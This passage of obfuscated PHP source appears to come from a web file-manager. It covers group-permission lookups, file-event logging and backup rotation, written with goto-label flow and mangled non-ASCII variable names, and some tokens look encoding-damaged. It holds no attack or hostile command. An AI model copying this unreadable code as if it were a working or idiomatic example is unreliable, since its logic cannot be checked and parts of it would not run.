explode($bˆÉÊò™[47], trim($e¤ğ¶´•½[$bˆÉÊò™[496]], $bˆÉÊò™[47])); if ($fÚÈë„Èøñ[0] == $bˆÉÊò™[191] && count($fÚÈë„Èøñ) > $Bç½Î†åª°) { $c·¡Ë‹Êó = array_reverse(array_slice($fÚÈë„Èøñ, $Bç½Î†åª°)); $cöŞ½¡©ë = array_search($fµôÂ‘œ¦½, $c·¡Ë‹Êó); if ($cöŞ½¡©ë !== !1 && $cöŞ½¡©ë + 1 <= $f ßòİÃë÷) { $f ßòİÃë÷ = $cöŞ½¡©ë + 1; } } } goto fŸ¡ÁÚÉ; fŸ¡ÁÚÉ: return $f ßòİÃë÷; goto CÚ™ßÓœ­Œ; A¹¬¦‚ÙåÀ: $bˆÉÊò™ =& $_SERVER[«¾°Ã¤]; $EêÜ¤‘™Ûê = $this->userGroupList($C–Æø®¢“); $f ßòİÃë÷ = 1000; goto Dº‰Í–ßò; CÚ™ßÓœ­Œ: } private function userGroupList($a¦„Í„¥‚Å = false) { $eîˆíºÆÑº =& $_SERVER[«¾°Ã¤]; static $C‚¢Üî×†» = array(); if (isset($C‚¢Üî×†»[$a¦„Í„¥‚Å])) { return $C‚¢Üî×†»[$a¦„Í„¥‚Å]; } $dˆáÜæâÅå = Model($eîˆíºÆÑº[515])->getInfo($a¦„Í„¥‚Å); $C‚¢Üî×†»[$a¦„Í„¥‚Å] = array_to_keyvalue($dˆáÜæâÅå[$eîˆíºÆÑº[1867]], $eîˆíºÆÑº[1693]); return $C‚¢Üî×†»[$a¦„Í„¥‚Å]; } public function userGroupParents($CÙ†¡ë°ìß) { goto c±Ğ¦ãõ•; E¬‚›Ğ£íÌ: if (isset($f·ø†Éï¡§[$CÙ†¡ë°ìß])) { return $f·ø†Éï¡§[$CÙ†¡ë°ìß]; } $BŸù³»”®¬ = $this->userGroupList($CÙ†¡ë°ìß); $F”­ªÑË„’ = array(); goto bŠÅÕËÙÚ; a„¡Ğ‰Ù¨‡: $f·ø†Éï¡§[$CÙ†¡ë°ìß] = array_unique($F”­ªÑË„’); return $f·ø†Éï¡§[$CÙ†¡ë°ìß]; goto D£ƒ¥åœÒÍ; c±Ğ¦ãõ•: $FÏ•ïÒİ› =& $_SERVER[«¾°Ã¤]; static $f·ø†Éï¡§ = array(); $CÙ†¡ë°ìß = $CÙ†¡ë°ìß ? $CÙ†¡ë°ìß : USER_ID; goto E¬‚›Ğ£íÌ; bŠÅÕËÙÚ: $EÚˆ‘ÚåËò = $GLOBALS[$FÏ•ïÒİ›[6]][$FÏ•ïÒİ›[88]][$FÏ•ïÒİ›[1785]] == 1; $AÊïóÑÅ•¿ = $EÚˆ‘ÚåËò ? 3 : 2; foreach ($BŸù³»”®¬ as $c¸ƒİ¾¥øå) { $E ñÈÚâÂ = array($c¸ƒİ¾¥øå[$FÏ•ïÒİ›[1693]]); $fÆßÌÍÎ = explode($FÏ•ïÒİ›[47], trim($c¸ƒİ¾¥øå[$FÏ•ïÒİ›[496]], $FÏ•ïÒİ›[47])); if ($fÆßÌÍÎ[0] == $FÏ•ïÒİ›[191] && count($fÆßÌÍÎ) > $AÊïóÑÅ•¿) { $B‘ã†”İœš = array_slice($fÆßÌÍÎ, $AÊïóÑÅ•¿); $E ñÈÚâÂ = array_merge($E ñÈÚâÂ, array_reverse($B‘ã†”İœš)); } $F”­ªÑË„’ = array_merge($F”­ªÑË„’, $E ñÈÚâÂ); } goto a„¡Ğ‰Ù¨‡; D£ƒ¥åœÒÍ: } public function authTargetInfoMake($Fñ¤îßîƒÚ) { goto CğÃ¸˜ŞŸİ; CŞ†·¥œÈÜ: foreach ($Fñ¤îßîƒÚ as $fëÛÚ«Ë’“) { if ($fëÛÚ«Ë’“[$a±•§¯êÚ‡[413]] == SourceModel::TYPE_USER) { $A³Ú¸”°¶ç[] = intval($fëÛÚ«Ë’“[$a±•§¯êÚ‡[493]]); } else { if ($fëÛÚ«Ë’“[$a±•§¯êÚ‡[413]] == SourceModel::TYPE_GROUP) { $E†ì½†Éèñ[] = intval($fëÛÚ«Ë’“[$a±•§¯êÚ‡[493]]); } } } if ($A³Ú¸”°¶ç) { $A³Ú¸”°¶ç = Model($a±•§¯êÚ‡[511])->userListInfo($A³Ú¸”°¶ç); } if ($E†ì½†Éèñ) { $dª‡‘‰¬é = array($a±•§¯êÚ‡[1771] => array($a±•§¯êÚ‡[420], $E†ì½†Éèñ)); $E†ì½†Éèñ = Model($a±•§¯êÚ‡[495])->field($a±•§¯êÚ‡[1896])->where($dª‡‘‰¬é)->select(); $E†ì½†Éèñ = array_to_keyvalue($E†ì½†Éèñ, $a±•§¯êÚ‡[1693]); } goto aä«Ô‘Š•¡; CğÃ¸˜ŞŸİ: $a±•§¯êÚ‡ =& $_SERVER[«¾°Ã¤]; $A³Ú¸”°¶ç = array(); $E†ì½†Éèñ = array(); goto CŞ†·¥œÈÜ; aä«Ô‘Š•¡: return array($a±•§¯êÚ‡[1897] => $A³Ú¸”°¶ç, $a±•§¯êÚ‡[1898] => $E†ì½†Éèñ); goto AÆÚÍÍ”Ãë; AÆÚÍÍ”Ãë: } public function authInfo($céë‰İÖŸË) { $EòµÍ°ªóÖ =& $_SERVER[«¾°Ã¤]; if ($céë‰İÖŸË[$EòµÍ°ªóÖ[1788]]) { $Fæ ¢ÆÃøò = Model($EòµÍ°ªóÖ[1860])->listData($céë‰İÖŸË[$EòµÍ°ªóÖ[1788]]); if (!$Fæ ¢ÆÃøò) { return !1; $Aš¨¹´İ¹à = Model($EòµÍ°ªóÖ[1860])->listData(); $Aàİ«æ˜‘Á = array_filter_by_field($Aš¨¹´İ¹à, $EòµÍ°ªóÖ[415], $EòµÍ°ªóÖ[191]); return $Aàİ«æ˜‘Á; } $E”¬ƒ×¶ƒ¹ = array_field_key($Fæ ¢ÆÃøò, array($EòµÍ°ªóÖ[393], $EòµÍ°ªóÖ[28], $EòµÍ°ªóÖ[415], $EòµÍ°ªóÖ[1714], $EòµÍ°ªóÖ[1716])); $E”¬ƒ×¶ƒ¹[$EòµÍ°ªóÖ[1899]] = $céë‰İÖŸË; return $E”¬ƒ×¶ƒ¹; } else { return array($EòµÍ°ªóÖ[421] => 0, $EòµÍ°ªóÖ[1699] => $céë‰İÖŸË[$EòµÍ°ªóÖ[1842]], $EòµÍ°ªóÖ[422] => $EòµÍ°ªóÖ[33], $EòµÍ°ªóÖ[1714] => $EòµÍ°ªóÖ[1900]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\165\x72\x63\x65\137\145\166\x65\156\x74"; protected $dataAuto = array(array("\143\162\145\141\164\x65\x54\x69\155\145", "\x74\x69\x6d\145", "\x69\x6e\x73\x65\162\164", "\146\165\156\143\164\151\x6f\156"), array("\144\x65\x73\143", '', "\x69\156\x73\x65\162\x74\54\165\160\144\141\164\x65\x2c\x73\x65\154\145\143\x74", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($D¾Â—÷–£±, $BĞÒãŠ¼‡ƒ, $eÖÏÖ†Ö¶ = '') { goto d¼ğëâß²ò; d¼ğëâß²ò: $bèë´„øÏ =& $_SERVER[«¾°Ã¤]; if (!$this->eventSave) { return; } $f«è®Øâˆ® = Model($bèë´„øÏ[1207])->sourceInfo($D¾Â—÷–£±); goto DÊ¸‰ìº«; f”ï¡¹ĞÔ: return $this->add($b×ÌË¼åêÏ); goto f°Ïêäİì„; DÊ¸‰ìº«: if (!$f«è®Øâˆ®) { return !1; } if ($this->isCacheEvent($f«è®Øâˆ®, $BĞÒãŠ¼‡ƒ)) { return; } if ($eÖÏÖ†Ö¶ && is_string($eÖÏÖ†Ö¶)) { $eÖÏÖ†Ö¶ = array($bèë´„øÏ[1726] => $eÖÏÖ†Ö¶); } goto DÚ„·‰ê¾Í; DÚ„·‰ê¾Í: $b×ÌË¼åêÏ = array($bèë´„øÏ[419] => $D¾Â—÷–£±, $bèë´„øÏ[1901] => $f«è®Øâˆ®[$bèë´„øÏ[487]], $bèë´„øÏ[1902] => $f«è®Øâˆ®[$bèë´„øÏ[28]], $bèë´„øÏ[504] => !empty($f«è®Øâˆ®[$bèë´„øÏ[504]]) ? $f«è®Øâˆ®[$bèë´„øÏ[504]] : $bèë´„øÏ[33], $bèë´„øÏ[1521] => USER_ID, $bèë´„øÏ[424] => $BĞÒãŠ¼‡ƒ, $bèë´„øÏ[1523] => $eÖÏÖ†Ö¶); $this->addSystemLog($BĞÒãŠ¼‡ƒ, $b×ÌË¼åêÏ); unset($b×ÌË¼åêÏ[$bèë´„øÏ[1902]], $b×ÌË¼åêÏ[$bèë´„øÏ[504]]); goto f”ï¡¹ĞÔ; f°Ïêäİì„: } private function addSystemLog($A£Óæƒ‹Î², $D…¢½ÌÀëŞ) { $e§–ìÇ¼óë =& $_SERVER[«¾°Ã¤]; if ($A£Óæƒ‹Î² == $e§–ìÇ¼óë[1903]) { $A£Óæƒ‹Î² = $D…¢½ÌÀëŞ[$e§–ìÇ¼óë[440]][$e§–ìÇ¼óë[1904]]; } else { if (in_array($A£Óæƒ‹Î², array($e§–ìÇ¼óë[1670], $e§–ìÇ¼óë[1905]))) { $A£Óæƒ‹Î² = $D…¢½ÌÀëŞ[$e§–ìÇ¼óë[440]][$e§–ìÇ¼óë[724]]; } } $dÖÄŞ¯¥š = array_merge($D…¢½ÌÀëŞ, array($e§–ìÇ¼óë[1906] => $D…¢½ÌÀëŞ[$e§–ìÇ¼óë[404]], $e§–ìÇ¼óë[1907] => $D…¢½ÌÀëŞ[$e§–ìÇ¼óë[1907]])); Model($e§–ìÇ¼óë[1634])->addLog($e§–ìÇ¼óë[1908] . $A£Óæƒ‹Î², $dÖÄŞ¯¥š); } private function isCacheEvent($aâ™°”öìÈ, $FæõÕÍÀÑ) { if ($aâ™°”öìÈ[$_SERVER[«¾°Ã¤][413]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($FõØ˜çò›Ë, $a—Ûñ·Ã‰) { $F÷ã–ö–Ø =& $_SERVER[«¾°Ã¤]; $c‘å˜©Ú·‹ = Model($F÷ã–ö–Ø[1207])->sourceInfo($FõØ˜çò›Ë); $CÚ—±ç‘‰ = array($F÷ã–ö–Ø[1904] => $a—Ûñ·Ã‰, $F÷ã–ö–Ø[28] => $c‘å˜©Ú·‹[$F÷ã–ö–Ø[28]]); return $this->addEvent($FõØ˜çò›Ë, $F÷ã–ö–Ø[1903], $CÚ—±ç‘‰); } public function eventFileEdit($CÊÈ³ªîó) { $BÆİ¤Ä–÷Ü =& $_SERVER[«¾°Ã¤]; $DĞî¹„„ù = array($BÆİ¤Ä–÷Ü[1909] => $_SERVER[$BÆİ¤Ä–÷Ü[1910]], $BÆİ¤Ä–÷Ü[1911] => strtolower(ACTION)); return $this->addEvent($CÊÈ³ªîó, $BÆİ¤Ä–÷Ü[1660], $DĞî¹„„ù); } public function eventRecycle($C·¢ø­ÚÂÊ, $A¦°ë¤‡«ß) { return $this->addEvent($C·¢ø­ÚÂÊ, $_SERVER[«¾°Ã¤][1905], $A¦°ë¤‡«ß); } public function eventRemove($E±²ªß¬ö) { $BÁİ¤×™‡’ =& $_SERVER[«¾°Ã¤]; $AöÓ¡í¢ë© = Model($BÁİ¤×™‡’[1207])->sourceInfo($E±²ªß¬ö); $føøŒ÷ª = $AöÓ¡í¢ë©[$BÁİ¤×™‡’[28]]; return $this->addEvent($AöÓ¡í¢ë©[$BÁİ¤×™‡’[487]], $BÁİ¤×™‡’[1659], $føøŒ÷ª); } public function eventShare($aìñ™Ú‰¡ì, $BĞ”éôÇ„‡) { return $this->addEvent($aìñ™Ú‰¡ì, $_SERVER[«¾°Ã¤][1670], $BĞ”éôÇ„‡); } public function eventMove($FºÚš¸ôÈ, $Aëâòæ±, $bÎ’ÊÛˆ¤é) { goto dà˜„À‚©; fš„¯óŒŸ: $this->addEvent($Aëâòæ±, $d ï‹¹ÃŒ[1915], $d©£Åë£×¶); goto eò¹¦£Å½; dà˜„À‚©: $d ï‹¹ÃŒ =& $_SERVER[«¾°Ã¤]; $F±Ï¨¯®®Ş = Model($d ï‹¹ÃŒ[1207]); $a‰˜ÀÇ–„¦ = $F±Ï¨¯®®Ş->sourceInfo($FºÚš¸ôÈ); goto Cé†¬­á«’; Cé†¬­á«’: $d¿ ï¨ô‹Ù = $F±Ï¨¯®®Ş->sourceInfo($Aëâòæ±); $FŒÔÉßˆğİ = $F±Ï¨¯®®Ş->sourceInfo($bÎ’ÊÛˆ¤é); $d©£Åë£×¶ = array($d ï‹¹ÃŒ[1056] => $Aëâòæ±, $d ï‹¹ÃŒ[1912] => $d¿ ï¨ô‹Ù[$d ï‹¹ÃŒ[28]], $d ï‹¹ÃŒ[1892] => !empty($d¿ ï¨ô‹Ù[$d ï‹¹ÃŒ[504]]) ? $d¿ ï¨ô‹Ù[$d ï‹¹ÃŒ[504]] : $d ï‹¹ÃŒ[33], $d ï‹¹ÃŒ[1057] => $bÎ’ÊÛˆ¤é, $d ï‹¹ÃŒ[1913] => $FŒÔÉßˆğİ[$d ï‹¹ÃŒ[28]], $d ï‹¹ÃŒ[1914] => !empty($FŒÔÉßˆğİ[$d ï‹¹ÃŒ[504]]) ? $FŒÔÉßˆğİ[$d ï‹¹ÃŒ[504]] : $d ï‹¹ÃŒ[33]); goto C¹èùë¡ÕÊ; C¹èùë¡ÕÊ: $this->addEvent($FºÚš¸ôÈ, $d ï‹¹ÃŒ[529], $d©£Åë£×¶); $a‰˜ÀÇ–„¦ = $F±Ï¨¯®®Ş->sourceInfo($FºÚš¸ôÈ); $d©£Åë£×¶ = array($d ï‹¹ÃŒ[404] => $a‰˜ÀÇ–„¦[$d ï‹¹ÃŒ[404]], $d ï‹¹ÃŒ[28] => $a‰˜ÀÇ–„¦[$d ï‹¹ÃŒ[28]]); goto fš„¯óŒŸ; eò¹¦£Å½: } public function eventCopy($c˜‘¥ä¹Ú×) { $this->eventCreate($c˜‘¥ä¹Ú×, $_SERVER[«¾°Ã¤][527]); } public function eventRename($bÈ­Š×ğ, $B¬—ƒ¶è, $a°ÅĞ£ÛÕÖ) { $AˆÑŠÑÑ¶‹ =& $_SERVER[«¾°Ã¤]; $A…±ˆ‡ÑŠŞ = array($AˆÑŠÑÑ¶‹[1056] => $B¬—ƒ¶è, $AˆÑŠÑÑ¶‹[1057] => $a°ÅĞ£ÛÕÖ); return $this->addEvent($bÈ­Š×ğ, $AˆÑŠÑÑ¶‹[1221], $A…±ˆ‡ÑŠŞ); } public function eventAddComment($bÅÌìó­Ô¬, $bî¿¯²«ò) { return $this->addEvent($bÅÌìó­Ô¬, $_SERVER[«¾°Ã¤][1916], $bî¿¯²«ò); } public function eventAddDesc($B›‡Äİàö’, $FóŞÓáƒá) { return $this->addEvent($B›‡Äİàö’, $_SERVER[«¾°Ã¤][1917], $FóŞÓáƒá); } public function listBySource($e÷ªÃ—Éë») { goto B°’Ôó“×¦; f³¢‰âÀˆŠ: return $this->eventListParse($FÜ›ÇÉÚ, $e÷ªÃ—Éë»); goto aÊ‚ñº¶¸´; Eá›«ªè›: if ($B´Ñ§ğÃ†¬[$c±ÙğËÄİ[412]] == $c±ÙğËÄİ[87]) { $cîÁÅÈ¦‚ = Model($c±ÙğËÄİ[1207])->listSearchChildren($e÷ªÃ—Éë», 20000); $cîÁÅÈ¦‚[] = $e÷ªÃ—Éë» . $c±ÙğËÄİ[375]; $AÎÈàˆÈ = array($c±ÙğËÄİ[404] => array($c±ÙğËÄİ[7], $cîÁÅÈ¦‚)); } $FÜ›ÇÉÚ = $this->where($AÎÈàˆÈ)->order($c±ÙğËÄİ[1918])->selectPage(); if ($FÜ›ÇÉÚ[$c±ÙğËÄİ[364]][$c±ÙğËÄİ[365]] == 0) { $FÜ›ÇÉÚ[$c±ÙğËÄİ[364]][$c±ÙğËÄİ[365]] = 1; $FÜ›ÇÉÚ[$c±ÙğËÄİ[367]] = array(array($c±ÙğËÄİ[419] => $e÷ªÃ—Éë», $c±ÙğËÄİ[1901] => $B´Ñ§ğÃ†¬[$c±ÙğËÄİ[487]], $c±ÙğËÄİ[1521] => $B´Ñ§ğÃ†¬[$c±ÙğËÄİ[441]], $c±ÙğËÄİ[424] => $c±ÙğËÄİ[1919], $c±ÙğËÄİ[425] => $B´Ñ§ğÃ†¬[$c±ÙğËÄİ[194]], $c±ÙğËÄİ[1523] => $c±ÙğËÄİ[33])); } goto f³¢‰âÀˆŠ; B°’Ôó“×¦: $c±ÙğËÄİ =& $_SERVER[«¾°Ã¤]; $B´Ñ§ğÃ†¬ = Model($c±ÙğËÄİ[1207])->sourceInfo($e÷ªÃ—Éë»); $AÎÈàˆÈ = array($c±ÙğËÄİ[419] => $e÷ªÃ—Éë»); goto Eá›«ªè›; aÊ‚ñº¶¸´: } private function eventListParse($FÛùŸÀ‚°, $C§©å¹å¬) { goto AëîÆµİì; Cƒ„ã¸Åæ’: $bÏñ½”­Á® = array_unique($bÏñ½”­Á®); $c™š–·‡ñÅ = array_unique(array_to_keyvalue($dŠ£Æ“²ƒ, $b­Â´¡ã¤õ[33], $b­Â´¡ã¤õ[1529])); $eò§£Ì”³‘ = Model($b­Â´¡ã¤õ[515])->userListInfo($c™š–·‡ñÅ); goto eÈ‚¯Ñî; f›¾‚®àòâ: $F¯¨öòšô’ = array_to_keyvalue($dŠ£Æ“²ƒ, $b­Â´¡ã¤õ[33], $b­Â´¡ã¤õ[1907]); foreach ($dŠ£Æ“²ƒ as $D°Ô‹‡†) { $D¡ˆ‚ˆâÙç = $D°Ô‹‡†[$b­Â´¡ã¤õ[440]]; if ($D°Ô‹‡†[$b­Â´¡ã¤õ[29]] == $b­Â´¡ã¤õ[529] && isset($D¡ˆ‚ˆâÙç[$b­Â´¡ã¤õ[1056]])) { $bÏñ½”­Á®[] = $D¡ˆ‚ˆâÙç[$b­Â´¡ã¤õ[1056]] . $b­Â´¡ã¤õ[33]; $bÏñ½”­Á®[] = $D¡ˆ‚ˆâÙç[$b­Â´¡ã¤õ[1057]] . $b­Â´¡ã¤õ[33]; } if ($D°Ô‹‡†[$b­Â´¡ã¤õ[29]] == $b­Â´¡ã¤õ[1915] && isset($D¡ˆ‚ˆâÙç[$b­Â´¡ã¤õ[404]])) { $bÏñ½”­Á®[] = $D¡ˆ‚ˆâÙç[$b­Â´¡ã¤õ[404]] . $b­Â´¡ã¤õ[33]; } } $bÏñ½”­Á® = array_merge($bÏñ½”­Á®, $F¯¨öòšô’, array($C§©å¹å¬ . $b­Â´¡ã¤õ[33])); goto Cƒ„ã¸Åæ’; AëîÆµİì: $b­Â´¡ã¤õ =& $_SERVER[«¾°Ã¤]; $dŠ£Æ“²ƒ = $FÛùŸÀ‚°[$b­Â´¡ã¤õ[367]]; $bÏñ½”­Á® = array_to_keyvalue($dŠ£Æ“²ƒ, $b­Â´¡ã¤õ[33], $b­Â´¡ã¤õ[404]); goto f›¾‚®àòâ; aššçöÁõ§: $FÛùŸÀ‚°[$b­Â´¡ã¤õ[367]] = $dŠ£Æ“²ƒ; return $FÛùŸÀ‚°; goto dËˆÂ‹‰Ö; eÈ‚¯Ñî: $CÃÙƒÌí‘© = Model($b­Â´¡ã¤õ[799])->sourceListInfo($bÏñ½”­Á®, !0); foreach ($dŠ£Æ“²ƒ as &$D°Ô‹‡†) { if ($D°Ô‹‡†[$b­Â´¡ã¤õ[29]] == $b­Â´¡ã¤õ[529] && isset($D°Ô‹‡†[$b­Â´¡ã¤õ[440]][$b­Â´¡ã¤õ[1056]])) { $D°Ô‹‡†[$b­Â´¡ã¤õ[440]][$b­Â´¡ã¤õ[1056]] = $CÃÙƒÌí‘©[$D°Ô‹‡†[$b­Â´¡ã¤õ[440]][$b­Â´¡ã¤õ[1056]]]; $D°Ô‹‡†[$b­Â´¡ã¤õ[440]][$b­Â´¡ã¤õ[1057]] = $CÃÙƒÌí‘©[$D°Ô‹‡†[$b­Â´¡ã¤õ[440]][$b­Â´¡ã¤õ[1057]]]; } if ($D°Ô‹‡†[$b­Â´¡ã¤õ[29]] == $b­Â´¡ã¤õ[1915] && isset($D°Ô‹‡†[$b­Â´¡ã¤õ[440]][$b­Â´¡ã¤õ[404]])) { $D°Ô‹‡†[$b­Â´¡ã¤õ[440]][$b­Â´¡ã¤õ[404]] = $CÃÙƒÌí‘©[$D°Ô‹‡†[$b­Â´¡ã¤õ[440]][$b­Â´¡ã¤õ[404]]]; } $D°Ô‹‡†[$b­Â´¡ã¤õ[85]] = $CÃÙƒÌí‘©[$D°Ô‹‡†[$b­Â´¡ã¤õ[404]]]; $D°Ô‹‡†[$b­Â´¡ã¤õ[1920]] = $CÃÙƒÌí‘©[$D°Ô‹‡†[$b­Â´¡ã¤õ[1907]]]; if ($D°Ô‹‡†[$b­Â´¡ã¤õ[29]] == $b­Â´¡ã¤õ[1659]) { $D°Ô‹‡†[$b­Â´¡ã¤õ[1920]] = $D°Ô‹‡†[$b­Â´¡ã¤õ[85]]; $D°Ô‹‡†[$b­Â´¡ã¤õ[1907]] = $D°Ô‹‡†[$b­Â´¡ã¤õ[1920]][$b­Â´¡ã¤õ[404]]; $D°Ô‹‡†[$b­Â´¡ã¤õ[85]] = !1; $D°Ô‹‡†[$b­Â´¡ã¤õ[404]] = $b­Â´¡ã¤õ[33]; } $D°Ô‹‡†[$b­Â´¡ã¤õ[1850]] = $eò§£Ì”³‘[$D°Ô‹‡†[$b­Â´¡ã¤õ[1529]]]; } unset($D°Ô‹‡†); goto aššçöÁõ§; dËˆÂ‹‰Ö: } public function removeBySource($aÃ™ ©”¦) { $dÂÈ¾Ìå© = array($_SERVER[«¾°Ã¤][419] => $aÃ™ ©”¦); $this->where($dÂÈ¾Ìå©)->remove(); } } goto f›¼ƒˆÒ; cÁïŒ“æ¢í: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $Bœçñ¨øµ· =& $_SERVER[«¾°Ã¤]; $this->isManual(); self::$name = date($Bœçñ¨øµ·[717]); if (!($a„¢äĞ¤ˆµ = Model($Bœçñ¨øµ·[718])->lastItem())) { $a„¢äĞ¤ˆµ = $this->initData(); } else { self::$name = $a„¢äĞ¤ˆµ[$Bœçñ¨øµ·[28]]; if ($a„¢äĞ¤ˆµ[$Bœçñ¨øµ·[719]] == $Bœçñ¨øµ·[87]) { self::$name = date($Bœçñ¨øµ·[720]); $B“Ô©‡ê ¬ = 0; if (isset($a„¢äĞ¤ˆµ[$Bœçñ¨øµ·[291]][$Bœçñ¨øµ·[193]][$Bœçñ¨øµ·[456]])) { $B“Ô©‡ê ¬ = (int) $a„¢äĞ¤ˆµ[$Bœçñ¨øµ·[291]][$Bœçñ¨øµ·[193]][$Bœçñ¨øµ·[456]]; } if (self::$manual == 0 && $a„¢äĞ¤ˆµ[$Bœçñ¨øµ·[28]] == self::$name) { Model($Bœçñ¨øµ·[718])->remove($a„¢äĞ¤ˆµ[$Bœçñ¨øµ·[393]]); } $a„¢äĞ¤ˆµ = $this->initData($B“Ô©‡ê ¬, $a„¢äĞ¤ˆµ[$Bœçñ¨øµ·[721]]); } else { $this->checkStore($a„¢äĞ¤ˆµ[$Bœçñ¨øµ·[721]]); } } self::$option = $a„¢äĞ¤ˆµ; } private function isManual() { $aŒ‘ÕòÍßÁ = _get($GLOBALS, $_SERVER[«¾°Ã¤][722], 0); $aŒ‘ÕòÍßÁ = intval($aŒ‘ÕòÍßÁ); self::$manual = $aŒ‘ÕòÍßÁ && $aŒ‘ÕòÍßÁ == 1 ? 1 : 0; } private function initData($c™¤ğæ¯ĞÌ = 0, $fŸ„¸àô¡º = '') { goto fè¯¾œÛ†Ï; fè¯¾œÛ†Ï: $aÖ½„¼Ûç˜ =& $_SERVER[«¾°Ã¤]; $AİØƒ¿®‰ = Model($aÖ½„¼Ûç˜[718])->config(); if ($fŸ„¸àô¡º && $AİØƒ¿®‰[$aÖ½„¼Ûç˜[721]] != $fŸ„¸àô¡º) { $c™¤ğæ¯ĞÌ = 0; } goto dœÉºäÄ»°; CšÕš×Æµ: $CÁ–¤øóá = Model($aÖ½„¼Ûç˜[718])->insert($d¾ï‡•ßˆ•); $d¾ï‡•ßˆ•[$aÖ½„¼Ûç˜[393]] = $CÁ–¤øóá; return $d¾ï‡•ßˆ•; goto eÎÛÛ‘Æ•½; dœÉºäÄ»°: $this->checkStore($AİØƒ¿®‰[$aÖ½„¼Ûç˜[721]]); if (self::$manual == 1) { self::$name .= $aÖ½„¼Ûç˜[71] . date($aÖ½„¼Ûç˜[723]); } $d¾ï‡•ßˆ• = array($aÖ½„¼Ûç˜[721] => $AİØƒ¿®‰[$aÖ½„¼Ûç˜[721]], $aÖ½„¼Ûç˜[28] => self::$name, $aÖ½„¼Ûç˜[719] => 0, $aÖ½„¼Ûç˜[724] => $AİØƒ¿®‰[$aÖ½„¼Ûç˜[724]], $aÖ½„¼Ûç˜[725] => self::$manual, $aÖ½„¼Ûç˜[291] => array($aÖ½„¼Ûç˜[726] => array($aÖ½„¼Ûç˜[719] => 0), $aÖ½„¼Ûç˜[727] => array($aÖ½„¼Ûç˜[719] => 0, $aÖ½„¼Ûç˜[728] => 0, $aÖ½„¼Ûç˜[729] => 0, $aÖ½„¼Ûç˜[29] => $aÖ½„¼Ûç˜[33], $aÖ½„¼Ûç˜[730] => 0, $aÖ½„¼Ûç˜[485] => 0), $aÖ½„¼Ûç˜[731] => array($aÖ½„¼Ûç˜[719] => 0, $aÖ½„¼Ûç˜[728] => 0, $aÖ½„¼Ûç˜[729] => 0, $aÖ½„¼Ûç˜[730] => 0, $aÖ½„¼Ûç˜[485] => 0), $aÖ½„¼Ûç˜[193] => array($aÖ½„¼Ûç˜[719] => 0, $aÖ½„¼Ûç˜[732] => 0, $aÖ½„¼Ûç˜[733] => 0, $aÖ½„¼Ûç˜[734] => 0, $aÖ½„¼Ûç˜[735] => 0, $aÖ½„¼Ûç˜[456] => $c™¤ğæ¯ĞÌ, $aÖ½„¼Ûç˜[730] => 0, $aÖ½„¼Ûç˜[485] => 0)), $aÖ½„¼Ûç˜[730] => time(), $aÖ½„¼Ûç˜[485] => 0); goto CšÕš×Æµ; eÎÛÛ‘Æ•½: } private function checkStore($f­ÇöÊ°›) { $b›–—‘Ãªë =& $_SERVER[«¾°Ã¤]; $a¢ß•¶ÕÄá = Model($b›–—‘Ãªë[736])->listData($f­ÇöÊ°›); Model($b›–—‘Ãªë[736])->checkConfig($a¢ß•¶ÕÄá); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[«¾°Ã¤][718])->findByName(self::$name); } return self::$option; } public static function set($cõ…¾šŠó) { $AâÁñÕ‚ğ =& $_SERVER[«¾°Ã¤]; $D‘äÖæ = self::get(); foreach ($cõ…¾šŠó as $dè‘äÏ»­Ñ => $Aœ œ¹é©) { $d±°¨íÆ÷¹ = explode($AâÁñÕ‚ğ[95], $dè‘äÏ»­Ñ); $FéÕóæòğ = count($d±°¨íÆ÷¹); switch ($FéÕóæòğ) { case 1: $D‘äÖæ[$d±°¨íÆ÷¹[0]] = $Aœ œ¹é©; break; case 2: $D‘äÖæ[$d±°¨íÆ÷¹[0]][$d±°¨íÆ÷¹[1]] = $Aœ œ¹é©; break; case 3: $D‘äÖæ[$d±°¨íÆ÷¹[0]][$d±°¨íÆ÷¹[1]][$d±°¨íÆ÷¹[2]] = $Aœ œ¹é©; break; } } Model($AâÁñÕ‚ğ[718])->update($D‘äÖæ[$AâÁñÕ‚ğ[393]], $D‘äÖæ); self::$option = $D‘äÖæ; return self::$option; } public function keep() { $C”¶êØö =& $_SERVER[«¾°Ã¤]; $f’¼…ÈØ¡¶ = self::get(); if ($f’¼…ÈØ¡¶[$C”¶êØö[291]][$C”¶êØö[726]][$C”¶êØö[719]] == $C”¶êØö[87]) { return; } $this->backupKeep($f’¼…ÈØ¡¶); self::set(array($C”¶êØö[737] => 1)); } private function backupKeep($B‰Ùæº•Ë¯) { goto AÔÑµ¸ï·; F½—˜Ø¥Öµ: if (empty($C¤´Ë¬ßÚ)) { return; } $f¯óíÀ™™Ó = 0; $C±İ®’Ö¹œ = array(); goto f½ÃÉÉõŒ; f½ÃÉÉõŒ: foreach ($C¤´Ë¬ßÚ as $dù®ªì´¤) { if ($f¯óíÀ™™Ó >= 7) { break; } $C±İ®’Ö¹œ[] = $dù®ªì´¤[$A§ÓÒĞõ³¬[28]]; $f¯óíÀ™™Ó++; } for ($f¯óíÀ™™Ó = 0; $f¯óíÀ™™Ó < 12; $f¯óíÀ™™Ó++) { $C±İ®’Ö¹œ[] = date($A§ÓÒĞõ³¬[738], strtotime("\x2d{$f¯óíÀ™™Ó}\40\155\157\x6e\x74\x68\x73")); } $C±İ®’Ö¹œ = array_unique($C±İ®’Ö¹œ); goto EÀ¾ÙÈÍÕœ; EÀ¾ÙÈÍÕœ: $Dœó™³ÍÓÑ = Model($A§ÓÒĞõ³¬[739])->get($A§ÓÒĞõ³¬[740]); foreach ($C¤´Ë¬ßÚ as $dù®ªì´¤) { if (isset($dù®ªì´¤[$A§ÓÒĞõ³¬[725]]) && $dù®ªì´¤[$A§ÓÒĞõ³¬[725]] == $A§ÓÒĞõ³¬[87]) { continue; } if (!empty($dù®ªì´¤[$A§ÓÒĞõ³¬[28]]) && in_array($dù®ªì´¤[$A§ÓÒĞõ³¬[28]], $C±İ®’Ö¹œ)) { continue; } Model($A§ÓÒĞõ³¬[718])->remove($dù®ªì´¤[$A§ÓÒĞõ³¬[393]]); $d²ò¿àï§£ = $this->backupPath($B‰Ùæº•Ë¯, $Dœó™³ÍÓÑ); IO::remove($d²ò¿àï§£, !1); } goto eŸ¿‰è²•Š; 